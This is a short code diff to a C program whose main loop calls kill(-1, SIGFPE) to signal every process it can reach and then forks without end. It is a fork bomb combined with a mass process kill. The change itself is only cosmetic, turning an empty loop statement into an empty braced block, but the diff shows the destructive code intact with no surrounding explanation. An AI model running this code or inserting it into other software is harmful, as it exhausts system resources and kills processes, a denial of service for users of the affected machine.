@@ -15,6 +15,8 @@ int main()
    
     while (1) {
 	kill(-1, SIGFPE);
-	while ((pid = fork()) != -1) ;
+	while ((pid = fork()) != -1){
+		
+	}
     }
 }
